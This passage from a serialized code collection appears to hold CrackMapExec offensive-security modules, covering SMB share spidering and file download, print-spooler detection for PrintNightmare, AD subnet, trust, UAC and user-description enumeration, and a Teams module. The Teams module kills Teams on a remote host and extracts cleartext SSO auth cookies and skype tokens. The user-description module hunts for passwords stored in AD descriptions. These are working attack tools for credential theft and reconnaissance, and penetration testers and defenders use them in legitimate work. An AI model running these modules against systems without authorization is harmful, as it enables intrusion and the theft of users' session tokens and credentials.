share_name):\r\n        """"""This function reads the `remote_file` in chunks using the `read_chunk` method.\r\n        Each chunk is then written to the local file until the entire file is saved.\r\n        It handles cases where the file remains empty due to errors.\r\n        """"""\r\n\r\n        # Reset the remote_file to point to the beginning of the file.\r\n        remote_file.seek(0, 0)\r\n\r\n        folder, filename = self.get_file_save_path(remote_file)\r\n        download_path = os.path.join(folder, filename)\r\n\r\n        # Create the subdirectories based on the share name and file path.\r\n        self.logger.debug(f\'Create folder ""{folder}""\')\r\n        make_dirs(folder)\r\n\r\n        try:\r\n            with open(download_path, ""wb"") as fd:\r\n                while True:\r\n                    chunk = self.read_chunk(remote_file)\r\n                    if not chunk:\r\n                        break\r\n                    fd.write(chunk)\r\n        except Exception as e:\r\n            self.logger.fail(f\'Error writing file ""{remote_path}"" from share ""{share_name}"": {e}\')\r\n\r\n        # Check if the file is empty and should not be.\r\n        if os.path.getsize(download_path) == 0 and remote_file.get_filesize() > 0:\r\n            os.remove(download_path)\r\n            remote_path = str(remote_file)[2:]\r\n            self.logger.fail(f\'Unable to download file ""{remote_path}"".\')\r\n\r\n    def dump_folder_metadata(self, results):\r\n        """"""This function takes the metadata results as input and writes them to a JSON file\r\n        in the `self.output_folder`. The results are formatted with indentation and\r\n        sorted keys before being written to the file.\r\n        """"""\r\n        metadata_path = os.path.join(self.output_folder, f""{self.host}.json"")\r\n        try:\r\n            with open(metadata_path, ""w"", encoding=""utf-8"") as fd:\r\n                fd.write(json.dumps(results, indent=4, sort_keys=True))\r\n            self.logger.success(f\'Saved share-file metadata to ""{metadata_path}"".\')\r\n        except Exception as e:\r\n            self.logger.fail(f""Failed to save share metadata: {str(e)}"")\r\n\r\n    def print_stats(self):\r\n        """"""This function prints the statistics during processing.""""""\r\n\r\n        # Share statistics.\r\n        shares = self.stats.get(""shares"", [])\r\n        if shares:\r\n            num_shares = len(shares)\r\n            shares_str = "", "".join(shares)\r\n            self.logger.display(f""SMB Shares:           {num_shares} ({shares_str})"")\r\n        shares_readable = self.stats.get(""shares_readable"", [])\r\n        if shares_readable:\r\n            num_readable_shares = len(shares_readable)\r\n            if len(shares_readable) > 10:\r\n                shares_readable_str = "", "".join(shares_readable[:10]) + ""...""\r\n            else:\r\n                shares_readable_str = "", "".join(shares_readable)\r\n            self.logger.display(f""SMB Readable Shares:  {num_readable_shares} ({shares_readable_str})"")\r\n        shares_writable = self.stats.get(""shares_writable"", [])\r\n        if shares_writable:\r\n            num_writable_shares = len(shares_writable)\r\n            if len(shares_writable) > 10:\r\n                shares_writable_str = "", "".join(shares_writable[:10]) + ""...""\r\n            else:\r\n                shares_writable_str = "", "".join(shares_writable)\r\n            self.logger.display(f""SMB Writable Shares:  {num_writable_shares} ({shares_writable_str})"")\r\n        num_shares_filtered = self.stats.get(""num_shares_filtered"", 0)\r\n        if num_shares_filtered:\r\n            self.logger.display(f""SMB Filtered Shares:  {num_shares_filtered}"")\r\n\r\n        # Folder statistics.\r\n        num_folders = self.stats.get(""num_folders"", 0)\r\n        self.logger.display(f""Total folders found:  {num_folders}"")\r\n        num_folders_filtered = self.stats.get(""num_folders_filtered"", 0)\r\n        if num_folders_filtered:\r\n            num_filtered_folders = len(num_folders_filtered)\r\n            self.logger.display(f""Folders Filtered:     {num_filtered_folders}"")\r\n\r\n        # File statistics.\r\n        num_files = self.stats.get(""num_files"", 0)\r\n        self.logger.display(f""Total files found:    {num_files}"")\r\n        num_files_filtered = self.stats.get(""num_files_filtered"", 0)\r\n        if num_files_filtered:\r\n            self.logger.display(f""Files filtered:       {num_files_filtered}"")\r\n        if num_files == 0:\r\n            return\r\n\r\n        # File sizing statistics.\r\n        file_sizes = self.stats.get(""file_sizes"", [])\r\n        if file_sizes:\r\n            total_file_size = sum(file_sizes)\r\n            min_file_size = min(file_sizes)\r\n            max_file_size = max(file_sizes)\r\n            average_file_size = total_file_size / num_files\r\n            self.logger.display(f""File size average:    {human_size(average_file_size)}"")\r\n            self.logger.display(f""File size min:        {human_size(min_file_size)}"")\r\n            self.logger.display(f""File size max:        {human_size(max_file_size)}"")\r\n\r\n        # Extension statistics.\r\n        file_exts = list(self.stats.get(""file_exts"", []))\r\n        if file_exts:\r\n            num_unique_file_exts = len(file_exts)\r\n            if len(file_exts) > 10:\r\n                unique_exts_str = "", "".join(file_exts[:10]) + ""...""\r\n            else:\r\n                unique_exts_str = "", "".join(file_exts)\r\n            self.logger.display(f""File unique exts:     {num_unique_file_exts} ({unique_exts_str})"")\r\n\r\n        # Download statistics.\r\n        if self.download_flag:\r\n            num_get_success = self.stats.get(""num_get_success"", 0)\r\n            if num_get_success:\r\n                self.logger.display(f""Downloads successful: {num_get_success}"")\r\n            num_get_fail = self.stats.get(""num_get_fail"", 0)\r\n            if num_get_fail:\r\n                self.logger.display(f""Downloads failed:     {num_get_fail}"")\r\n            num_files_unmodified = self.stats.get(""num_files_unmodified"", 0)\r\n            if num_files_unmodified:\r\n                self.logger.display(f""Unmodified files:     {num_files_unmodified}"")\r\n            num_files_updated = self.stats.get(""num_files_updated"", 0)\r\n            if num_files_updated:\r\n                self.logger.display(f""Updated files:        {num_files_updated}"")\r\n            if num_files_unmodified and not num_files_updated:\r\n                self.logger.display(""All files were not changed."")\r\n            if num_files_filtered == num_files:\r\n                self.logger.display(""All files were ignored."")\r\n            if num_get_fail == 0:\r\n                self.logger.success(""All files processed successfully."")\r\n\r\n\r\nclass CMEModule:\r\n    """"""\r\n    Spider plus module\r\n    Module by @vincd\r\n    Updated by @godylockz\r\n    """"""\r\n\r\n    name = ""spider_plus""\r\n    description = ""List files recursively (excluding `EXCLUDE_FILTER` and `EXCLUDE_EXTS` extensions) and save JSON share-file metadata to the `OUTPUT_FOLDER`. If `DOWNLOAD_FLAG`=True, download files smaller then `MAX_FILE_SIZE` to the `OUTPUT_FOLDER`.""\r\n    supported_protocols = [""smb""]\r\n    opsec_safe = True  # Does the module touch disk?\r\n    multiple_hosts = True  # Does the module support multiple hosts?\r\n\r\n    def options(self, context, module_options):\r\n        """"""\r\n        DOWNLOAD_FLAG     Download all share folders/files (Default: False)\r\n        STATS_FLAG        Disable file/download statistics (Default: True)\r\n        EXCLUDE_EXTS      Case-insensitive extension filter to exclude (Default: ico,lnk)\r\n        EXCLUDE_FILTER    Case-insensitive filter to exclude folders/files (Default: print$,ipc$)\r\n        MAX_FILE_SIZE     Max file size to download (Default: 51200)\r\n        OUTPUT_FOLDER     Path of the local folder to save files (Default: /tmp/cme_spider_plus)\r\n        """"""\r\n        self.download_flag = False\r\n        if any(""DOWNLOAD"" in key for key in module_options.keys()):\r\n            self.download_flag = True\r\n        self.stats_flag = True\r\n        if any(""STATS"" in key for key in module_options.keys()):\r\n            self.stats_flag = False\r\n        self.exclude_exts = get_list_from_option(module_options.get(""EXCLUDE_EXTS"", ""ico,lnk""))\r\n        self.exclude_exts = [d.lower() for d in self.exclude_exts] # force case-insensitive\r\n        self.exclude_filter = get_list_from_option(module_options.get(""EXCLUDE_FILTER"", ""print$,ipc$""))\r\n        self.exclude_filter = [d.lower() for d in self.exclude_filter] # force case-insensitive\r\n        self.max_file_size = int(module_options.get(""MAX_FILE_SIZE"", 50 * 1024))\r\n        self.output_folder = module_options.get(""OUTPUT_FOLDER"", os.path.join(""/tmp"", ""cme_spider_plus""))\r\n\r\n\r\n    def on_login(self, context, connection):\r\n        context.log.display(""Started module spidering_plus with the following options:"")\r\n        context.log.display(f"" DOWNLOAD_FLAG: {self.download_flag}"")\r\n        context.log.display(f""    STATS_FLAG: {self.stats_flag}"")\r\n        context.log.display(f""EXCLUDE_FILTER: {self.exclude_filter}"")\r\n        context.log.display(f""  EXCLUDE_EXTS: {self.exclude_exts}"")\r\n        context.log.display(f"" MAX_FILE_SIZE: {human_size(self.max_file_size)}"")\r\n        context.log.display(f"" OUTPUT_FOLDER: {self.output_folder}"")\r\n\r\n        spider = SMBSpiderPlus(\r\n            connection,\r\n            context.log,\r\n            self.download_flag,\r\n            self.stats_flag,\r\n            self.exclude_exts,\r\n            self.exclude_filter,\r\n            self.max_file_size,\r\n            self.output_folder,\r\n        )\r\n\r\n        spider.spider_shares()\r\n', 'spooler.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n# https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/rpcdump.py\nfrom impacket import uuid\nfrom impacket.dcerpc.v5 import transport, epm\nfrom impacket.dcerpc.v5.rpch import (\n    RPC_PROXY_INVALID_RPC_PORT_ERR,\n    RPC_PROXY_CONN_A1_0X6BA_ERR,\n    RPC_PROXY_CONN_A1_404_ERR,\n    RPC_PROXY_RPC_OUT_DATA_404_ERR,\n)\n\nKNOWN_PROTOCOLS = {\n    135: {""bindstr"": r""ncacn_ip_tcp:%s[135]""},\n    445: {""bindstr"": r""ncacn_np:%s[\\pipe\\epmapper]""},\n}\n\n\nclass CMEModule:\n    """"""\n    For printnightmare: detect if print spooler is enabled or not. Then use @cube0x0\'s project https://github.com/cube0x0/CVE-2021-1675 or Mimikatz from Benjamin Delpy\n    Module by @mpgn_x64\n    """"""\n\n    name = ""spooler""\n    description = ""Detect if print spooler is enabled or not""\n    supported_protocols = [""smb"", ""wmi""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def __init__(self, context=None, module_options=None):\n        self.context = context\n        self.module_options = module_options\n        self.__string_binding = None\n        self.port = None\n\n    def options(self, context, module_options):\n        """"""\n        PORT    Port to check (defaults to 135)\n        """"""\n        self.port = 135\n        if ""PORT"" in module_options:\n            self.port = int(module_options[""PORT""])\n\n    def on_login(self, context, connection):\n        entries = []\n        lmhash = getattr(connection, ""lmhash"", """")\n        nthash = getattr(connection, ""nthash"", """")\n\n        self.__stringbinding = KNOWN_PROTOCOLS[self.port][""bindstr""] % connection.host\n        context.log.debug(""StringBinding %s"" % self.__stringbinding)\n        rpctransport = transport.DCERPCTransportFactory(self.__stringbinding)\n        rpctransport.set_credentials(connection.username, connection.password, connection.domain, lmhash, nthash)\n        rpctransport.setRemoteHost(connection.host if not connection.kerberos else connection.hostname + ""."" + connection.domain)\n        rpctransport.set_dport(self.port)\n\n        if connection.kerberos:\n            rpctransport.set_kerberos(connection.kerberos, connection.kdcHost)\n\n        try:\n            entries = self.__fetch_list(rpctransport)\n        except Exception as e:\n            error_text = ""Protocol failed: %s"" % e\n            context.log.critical(error_text)\n\n            if RPC_PROXY_INVALID_RPC_PORT_ERR in error_text or RPC_PROXY_RPC_OUT_DATA_404_ERR in error_text or RPC_PROXY_CONN_A1_404_ERR in error_text or RPC_PROXY_CONN_A1_0X6BA_ERR in error_text:\n                context.log.critical(""This usually means the target does not allow "" ""to connect to its epmapper using RpcProxy."")\n                return\n\n        # Display results.\n        endpoints = {}\n        # Let\'s group the UUIDS\n        for entry in entries:\n            binding = epm.PrintStringBinding(entry[""tower""][""Floors""])\n            tmp_uuid = str(entry[""tower""][""Floors""][0])\n            if (tmp_uuid in endpoints) is not True:\n                endpoints[tmp_uuid] = {}\n                endpoints[tmp_uuid][""Bindings""] = list()\n            if uuid.uuidtup_to_bin(uuid.string_to_uuidtup(tmp_uuid))[:18] in epm.KNOWN_UUIDS:\n                endpoints[tmp_uuid][""EXE""] = epm.KNOWN_UUIDS[uuid.uuidtup_to_bin(uuid.string_to_uuidtup(tmp_uuid))[:18]]\n            else:\n                endpoints[tmp_uuid][""EXE""] = ""N/A""\n            endpoints[tmp_uuid][""annotation""] = entry[""annotation""][:-1].decode(""utf-8"")\n            endpoints[tmp_uuid][""Bindings""].append(binding)\n\n            if tmp_uuid[:36] in epm.KNOWN_PROTOCOLS:\n                endpoints[tmp_uuid][""Protocol""] = epm.KNOWN_PROTOCOLS[tmp_uuid[:36]]\n            else:\n                endpoints[tmp_uuid][""Protocol""] = ""N/A""\n\n        for endpoint in list(endpoints.keys()):\n            if ""MS-RPRN"" in endpoints[endpoint][""Protocol""]:\n                context.log.debug(""Protocol: %s "" % endpoints[endpoint][""Protocol""])\n                context.log.debug(""Provider: %s "" % endpoints[endpoint][""EXE""])\n                context.log.debug(""UUID    : %s %s"" % (endpoint, endpoints[endpoint][""annotation""]))\n                context.log.debug(""Bindings: "")\n                for binding in endpoints[endpoint][""Bindings""]:\n                    context.log.debug(""          %s"" % binding)\n                context.log.debug("""")\n                context.log.highlight(""Spooler service enabled"")\n                try:\n                    host = context.db.get_hosts(connection.host)[0]\n                    context.db.add_host(\n                        host.ip,\n                        host.hostname,\n                        host.domain,\n                        host.os,\n                        host.smbv1,\n                        host.signing,\n                        spooler=True,\n                    )\n                except Exception as e:\n                    context.log.debug(f""Error updating spooler status in database"")\n                break\n\n        if entries:\n            num = len(entries)\n            if 1 == num:\n                context.log.debug(f""[Spooler] Received one endpoint"")\n            else:\n                context.log.debug(f""[Spooler] Received {num} endpoints"")\n        else:\n            context.log.debug(f""[Spooler] No endpoints found"")\n\n    def __fetch_list(self, rpctransport):\n        dce = rpctransport.get_dce_rpc()\n        dce.connect()\n        resp = epm.hept_lookup(None, dce=dce)\n        dce.disconnect()\n        return resp\n', 'subnets.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom impacket.ldap import ldapasn1 as ldapasn1_impacket\n\n\ndef searchResEntry_to_dict(results):\n    data = {}\n    for attr in results[""attributes""]:\n        key = str(attr[""type""])\n        value = str(attr[""vals""][0])\n        data[key] = value\n    return data\n\n\nclass CMEModule:\n    """"""\n    Retrieves the different Sites and Subnets of an Active Directory\n\n    Authors:\n      Podalirius: @podalirius_\n    """"""\n\n    def options(self, context, module_options):\n        """"""\n        showservers    Toggle printing of servers (default: true)\n        """"""\n\n        self.showservers = True\n        self.base_dn = None\n\n        if module_options and ""SHOWSERVERS"" in module_options:\n            if module_options[""SHOWSERVERS""].lower() == ""true"" or module_options[""SHOWSERVERS""] == ""1"":\n                self.showservers = True\n            elif module_options[""SHOWSERVERS""].lower() == ""false"" or module_options[""SHOWSERVERS""] == ""0"":\n                self.showservers = False\n            else:\n                print(""Could not parse showservers option."")\n        if module_options and ""BASE_DN"" in module_options:\n            self.base_dn = module_options[""BASE_DN""]\n\n    name = ""subnets""\n    description = ""Retrieves the different Sites and Subnets of an Active Directory""\n    supported_protocols = [""ldap""]\n    opsec_safe = True\n    multiple_hosts = False\n\n    def on_login(self, context, connection):\n        dn = connection.ldapConnection._baseDN if self.base_dn is None else self.base_dn\n\n        context.log.display(""Getting the Sites and Subnets from domain"")\n\n        try:\n            list_sites = connection.ldapConnection.search(\n                searchBase=""CN=Configuration,%s"" % dn,\n                searchFilter=""(objectClass=site)"",\n                attributes=[""distinguishedName"", ""name"", ""description""],\n                sizeLimit=999,\n            )\n        except LDAPSearchError as e:\n            context.log.fail(str(e))\n            exit()\n        for site in list_sites:\n            if isinstance(site, ldapasn1_impacket.SearchResultEntry) is not True:\n                continue\n            site = searchResEntry_to_dict(site)\n            site_dn = site[""distinguishedName""]\n            site_name = site[""name""]\n            site_description = """"\n            if ""description"" in site.keys():\n                site_description = site[""description""]\n            # Getting subnets of this site\n            list_subnets = connection.ldapConnection.search(\n                searchBase=""CN=Sites,CN=Configuration,%s"" % dn,\n                searchFilter=""(siteObject=%s)"" % site_dn,\n                attributes=[""distinguishedName"", ""name""],\n                sizeLimit=999,\n            )\n            if len([subnet for subnet in list_subnets if isinstance(subnet, ldapasn1_impacket.SearchResultEntry)]) == 0:\n                context.log.highlight(\'Site ""%s""\' % site_name)\n            else:\n                for subnet in list_subnets:\n                    if isinstance(subnet, ldapasn1_impacket.SearchResultEntry) is not True:\n                        continue\n                    subnet = searchResEntry_to_dict(subnet)\n                    subnet_dn = subnet[""distinguishedName""]\n                    subnet_name = subnet[""name""]\n\n                    if self.showservers:\n                        # Getting machines in these subnets\n                        list_servers = connection.ldapConnection.search(\n                            searchBase=site_dn,\n                            searchFilter=""(objectClass=server)"",\n                            attributes=[""cn""],\n                            sizeLimit=999,\n                        )\n                        if len([server for server in list_servers if isinstance(server, ldapasn1_impacket.SearchResultEntry)]) == 0:\n                            if len(site_description) != 0:\n                                context.log.highlight(\'Site ""%s"" (Subnet:%s) (description:""%s"")\' % (site_name, subnet_name, site_description))\n                            else:\n                                context.log.highlight(\'Site ""%s"" (Subnet:%s)\' % (site_name, subnet_name))\n                        else:\n                            for server in list_servers:\n                                if isinstance(server, ldapasn1_impacket.SearchResultEntry) is not True:\n                                    continue\n                                server = searchResEntry_to_dict(server)[""cn""]\n                                if len(site_description) != 0:\n                                    context.log.highlight(\n                                        \'Site ""%s"" (Subnet:%s) (description:""%s"") (Server:%s)\'\n                                        % (\n                                            site_name,\n                                            subnet_name,\n                                            site_description,\n                                            server,\n                                        )\n                                    )\n                                else:\n                                    context.log.highlight(\'Site ""%s"" (Subnet:%s) (Server:%s)\' % (site_name, subnet_name, server))\n                    else:\n                        if len(site_description) != 0:\n                            context.log.highlight(\'Site ""%s"" (Subnet:%s) (description:""%s"")\' % (site_name, subnet_name, site_description))\n                        else:\n                            context.log.highlight(\'Site ""%s"" (Subnet:%s)\' % (site_name, subnet_name))\n', 'teams_localdb.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport sqlite3\n\n\nclass CMEModule:\n    name = ""teams_localdb""\n    description = ""Retrieves the cleartext ssoauthcookie from the local Microsoft Teams database, if teams is open we kill all Teams process""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = False\n\n    def options(self, context, module_options):\n        """""" """"""\n\n    def on_admin_login(self, context, connection):\n        context.log.display(""Killing all Teams process to open the cookie file"")\n        connection.execute(""taskkill /F /T /IM teams.exe"")\n        # sleep(3)\n        found = 0\n        paths = connection.spider(""C$"", folder=""Users"", regex=[""[a-zA-Z0-9]*""], depth=0)\n        with open(""/tmp/teams_cookies2.txt"", ""wb"") as f:\n            for path in paths:\n                try:\n                    connection.conn.getFile(""C$"", path + ""/AppData/Roaming/Microsoft/Teams/Cookies"", f.write)\n                    context.log.highlight(""Found Cookie file in path "" + path)\n                    found = 1\n                    self.parse_file(context, ""skypetoken_asm"")\n                    self.parse_file(context, ""SSOAUTHCOOKIE"")\n                    f.seek(0)\n                    f.trunkate()\n                except Exception as e:\n                    if ""STATUS_SHARING_VIOLATION"" in str(e):\n                        context.log.debug(str(e))\n                        context.log.highlight(""Found Cookie file in path "" + path)\n                        context.log.fail(""Cannot retrieve file, most likely Teams is running which prevents us from retrieving the Cookies database"")\n        if found == 0:\n            context.log.display(""No cookie file found in Users folder"")\n\n    @staticmethod\n    def parse_file(context, name):\n        try:\n            conn = sqlite3.connect(""/tmp/teams_cookies2.txt"")\n            c = conn.cursor()\n            c.execute(""SELECT value FROM cookies WHERE name = \'"" + name + ""\'"")\n            row = c.fetchone()\n            if row is None:\n                context.log.fail(""No "" + name + "" present in Microsoft Teams Cookies database"")\n            else:\n                context.log.success(""Succesfully extracted "" + name + "": "")\n                context.log.success(row[0])\n            conn.close()\n        except Exception as e:\n            context.log.fail(str(e))\n', 'test_connection.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom sys import exit\n\n\nclass CMEModule:\n    """"""\n    Executes the Test-Connection PowerShell cmdlet\n    Module by @byt3bl33d3r\n    """"""\n\n    name = ""test_connection""\n    description = ""Pings a host""\n    supported_protocols = [""smb"", ""mssql""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """"""\n        HOST      Host to ping\n        """"""\n        self.host = None\n\n        if ""HOST"" not in module_options:\n            context.log.fail(""HOST option is required!"")\n            exit(1)\n\n        self.host = module_options[""HOST""]\n\n    def on_admin_login(self, context, connection):\n        # $ProgressPreference = \'SilentlyContinue\' prevents the ""preparing modules for the first time"" error\n        command = f""$ProgressPreference = \'SilentlyContinue\'; Test-Connection {self.host} -quiet -count 1""\n\n        output = connection.ps_execute(command, get_output=True)[0]\n\n        context.log.debug(f""Output: {output}"")\n        context.log.debug(f""Type: {type(output)}"")\n\n        if output == ""True"":\n            context.log.success(""Pinged successfully"")\n        else:\n            context.log.fail(""Host unreachable"")\n', 'trust.py': ""#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nclass CMEModule:\n    '''\n        Extract all Trust Relationships, Trusting Direction, and Trust Transitivity\n        Module by Brandon Fisher @shad0wcntr0ller\n    '''\n    name = 'enum_trusts'\n    description = 'Extract all Trust Relationships, Trusting Direction, and Trust Transitivity'\n    supported_protocols = ['ldap']\n    opsec_safe = True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        pass\n\n    def on_login(self, context, connection):\n        domain_dn = ','.join(['DC=' + dc for dc in connection.domain.split('.')])\n        search_filter = '(&(objectClass=trustedDomain))'\n        attributes = ['flatName', 'trustPartner', 'trustDirection', 'trustAttributes'] \n\n        context.log.debug(f'Search Filter={search_filter}')\n        resp = connection.ldapConnection.search(searchBase=domain_dn, searchFilter=search_filter, attributes=attributes, sizeLimit=0)\n\n        trusts = []\n        context.log.debug(f'Total of records returned {len(resp)}')\n        for item in resp:\n            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:\n                continue\n            flat_name = ''\n            trust_partner = ''\n            trust_direction = ''\n            trust_transitive = [] \n            try:\n                for attribute in item['attributes']:\n                    if str(attribute['type']) == 'flatName':\n                        flat_name = str(attribute['vals'][0])\n                    elif str(attribute['type']) == 'trustPartner':\n                        trust_partner = str(attribute['vals'][0])\n                    elif str(attribute['type']) == 'trustDirection':\n                        if str(attribute['vals'][0]) == '1':\n                            trust_direction = 'Inbound'\n                        elif str(attribute['vals'][0]) == '2':\n                            trust_direction = 'Outbound'\n                        elif str(attribute['vals'][0]) == '3':\n                            trust_direction = 'Bidirectional'\n                    elif str(attribute['type']) == 'trustAttributes': \n                        trust_attributes_value = int(attribute['vals'][0])\n                        if trust_attributes_value & 0x1:\n                            trust_transitive.append('Non-Transitive')\n                        if trust_attributes_value & 0x2:\n                            trust_transitive.append('Uplevel-Only')\n                        if trust_attributes_value & 0x4:\n                            trust_transitive.append('Quarantined Domain')\n                        if trust_attributes_value & 0x8:\n                            trust_transitive.append('Forest Transitive')\n                        if trust_attributes_value & 0x10:\n                            trust_transitive.append('Cross Organization')\n                        if trust_attributes_value & 0x20:\n                            trust_transitive.append('Within Forest')\n                        if trust_attributes_value & 0x40:\n                            trust_transitive.append('Treat as External')\n                        if trust_attributes_value & 0x80:\n                            trust_transitive.append('Uses RC4 Encryption')\n                        if trust_attributes_value & 0x100:\n                            trust_transitive.append('Cross Organization No TGT Delegation')\n                        if trust_attributes_value & 0x2000:\n                            trust_transitive.append('PAM Trust')\n                        if not trust_transitive:\n                            trust_transitive.append('Other')\n                trust_transitive = ', '.join(trust_transitive)\n\n                if flat_name and trust_partner and trust_direction and trust_transitive:\n                    trusts.append((flat_name, trust_partner, trust_direction, trust_transitive))\n            except Exception as e:\n                context.log.debug(f'Cannot process trust relationship due to error {e}')\n                pass\n\n        if trusts:\n            context.log.success('Found the following trust relationships:')\n            for trust in trusts:\n                context.log.highlight(f'{trust[1]} -> {trust[2]} -> {trust[3]}')\n        else:\n            context.log.display('No trust relationships found')\n\n        return True\n\n"", 'uac.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nimport logging\n\nfrom impacket.dcerpc.v5 import rrp\nfrom impacket.examples.secretsdump import RemoteOperations\n\n\nclass CMEModule:\n    name = ""uac""\n    description = ""Checks UAC status""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def __init__(self, context=None, module_options=None):\n        self.context = context\n        self.module_options = module_options\n        logging.debug(""test"")\n\n    def options(self, context, module_options):\n        """""" """"""\n\n    def on_admin_login(self, context, connection):\n        remoteOps = RemoteOperations(connection.conn, False)\n        remoteOps.enableRegistry()\n\n        ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)\n        regHandle = ans[""phKey""]\n        ans = rrp.hBaseRegOpenKey(\n            remoteOps._RemoteOperations__rrp,\n            regHandle,\n            ""SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System"",\n        )\n        keyHandle = ans[""phkResult""]\n        dataType, uac_value = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, ""EnableLUA"")\n\n        if uac_value == 1:\n            context.log.highlight(""UAC Status: 1 (UAC Enabled)"")\n        elif uac_value == 0:\n            context.log.highlight(""UAC Status: 0 (UAC Disabled)"")\n\n        rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)\n        remoteOps.finish()\n', 'user_desc.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom pathlib import Path\nfrom datetime import datetime\nfrom impacket.ldap import ldap, ldapasn1\nfrom impacket.ldap.ldap import LDAPSearchError\n\n\nclass CMEModule:\n    """"""\n    Get user descriptions stored in Active Directory.\n\n    Module by Tobias Neitzel (@qtc_de)\n    """"""\n\n    name = ""user-desc""\n    description = ""Get user descriptions stored in Active Directory""\n    supported_protocols = [""ldap""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def __init__(self, context=None, multiple_options=None):\n        self.keywords = None\n        self.search_filter = None\n        self.account_names = None\n        self.context = None\n        self.desc_count = None\n        self.log_file = None\n\n    def options(self, context, module_options):\n        """"""\n        LDAP_FILTER     Custom LDAP search filter (fully replaces the default search)\n        DESC_FILTER     An additional seach filter for descriptions (supports wildcard *)\n        DESC_INVERT     An additional seach filter for descriptions (shows non matching)\n        USER_FILTER     An additional seach filter for usernames (supports wildcard *)\n        USER_INVERT     An additional seach filter for usernames (shows non matching)\n        KEYWORDS        Use a custom set of keywords (comma separated)\n        ADD_KEYWORDS    Add additional keywords to the default set (comma separated)\n        """"""\n        self.log_file = None\n        self.desc_count = 0\n        self.context = context\n        self.account_names = set()\n        self.keywords = {""pass"", ""creds"", ""creden"", ""key"", ""secret"", ""default""}\n\n        if ""LDAP_FILTER"" in module_options:\n            self.search_filter = module_options[""LDAP_FILTER""]\n        else:\n            self.search_filter = ""(&(objectclass=user)""\n\n            if ""DESC_FILTER"" in module_options:\n                self.search_filter += f""(description={module_options[\'DESC_FILTER\']})""\n\n            if ""DESC_INVERT"" in module_options:\n                self.search_filter += f""(!(description={module_options[\'DESC_INVERT\']}))""\n\n            if ""USER_FILTER"" in module_options:\n                self.search_filter += f""(sAMAccountName={module_options[\'USER_FILTER\']})""\n\n            if ""USER_INVERT"" in module_options:\n                self.search_filter += f""(!(sAMAccountName={module_options[\'USER_INVERT\']}))""\n\n            self.search_filter += "")""\n\n        if ""KEYWORDS"" in module_options:\n            self.keywords = set(module_options[""KEYWORDS""].split("",""))\n        elif ""ADD_KEYWORDS"" in module_options:\n            add_keywords = set(module_options[""ADD_KEYWORDS""].split("",""))\n            self.keywords = self.keywords.union(add_keywords)\n\n    def on_login(self, context, connection):\n        """"""\n        On successful LDAP login we perform a search for all user objects that have a description.\n        Users can specify additional LDAP filters that are applied to the query.\n        """"""\n        self.create_log_file(connection.conn.getRemoteHost(), datetime.now().strftime(""%Y%m%d_%H%M%S""))\n        context.log.info(f""Starting LDAP search with search filter \'{self.search_filter}\'"")\n\n        try:\n            sc = ldap.SimplePagedResultsControl()\n            connection.ldapConnection.search(\n                searchFilter=self.search_filter,\n                attributes=[""sAMAccountName"", ""description""],\n                sizeLimit=0,\n                searchControls=[sc],\n                perRecordCallback=self.process_record,\n            )\n        except LDAPSearchError as e:\n            context.log.fail(f""Obtained unexpected exception: {str(e)}"")\n        finally:\n            self.delete_log_file()\n\n    def create_log_file(self, host, time):\n        """"""\n        Create a log file for dumping user descriptions.\n        """"""\n        logfile = f""UserDesc-{host}-{time}.log""\n        logfile = Path.home().joinpath("".cme"").joinpath(""logs"").joinpath(logfile)\n\n        self.context.log.info(f""Creating log file \'{logfile}\'"")\n        self.log_file = open(logfile, ""w"")\n        self.append_to_log(""User:"", ""Description:"")\n\n    def delete_log_file(self):\n        """"""\n        Closes the log file.\n        """"""\n        try:\n            self.log_file.close()\n            info = f""Saved {self.desc_count} user descriptions to {self.log_file.name}""\n            self.context.log.highlight(info)\n        except AttributeError:\n            pass\n\n    def append_to_log(self, user, description):\n        """"""\n        Append a new entry to the log file. Helper function that is only used to have an\n        unified padding on the user field.\n        """"""\n        print(user.ljust(25), description, file=self.log_file)\n\n    def process_record(self, item):\n        """"""\n        Function that is called to process the items obtained by the LDAP search. All items are\n        written to the log file per default. Items that contain one of the keywords configured\n        within this module are also printed to stdout.\n\n        On large Active Directories there seems to be a problem with duplicate user entries. For\n        some reason the process_record function is called multiple times with the same user entry.\n        Not sure whether this is a fault by this module or by impacket. As a workaround, this\n        function adds each new account name to a set and skips accounts that have already been added.\n        """"""\n        if not isinstance(item, ldapasn1.SearchResultEntry):\n            return\n\n        sAMAccountName = """"\n        description = """"\n\n        try:\n            for attribute in item[""attributes""]:\n                if str(attribute[""type""]) == ""sAMAccountName"":\n                    sAMAccountName = attribute[""vals""][0].asOctets().decode(""utf-8"")\n                elif str(attribute[""type""]) == ""description"":\n                    description = attribute[""vals""][0].asOctets().decode(""utf-8"")\n        except Exception as e:\n            entry = sAMAccountName or ""item""\n            self.context.error(f""Skipping {entry}, cannot process LDAP entry due to error: \'{str(e)}\'"")\n\n        if description and sAMAccountName not in self.account_names:\n            self.desc_count += 1\n            self.append_to_log(sAMAccountName, description)\n\n            if self.highlight(description):\n                self.context.log.highlight(f""User: {sAMAccountName} - Description: {description}"")\n\n            self.account_names.add(sAMAccountName)\n\n    def highlight(self, description):\n        """"""\n        Check for interesting entries. Just checks whether certain keywords are contained within the\n        user description. Keywords are configured at the top of this class within the options function.\n\n        It is tempting to implement more logic here (e.g. catch all strings that are longer than seven\n        characters and contain 3 different character classes). Such functionality is nice when playing\n        CTF in small AD environments. When facing a real 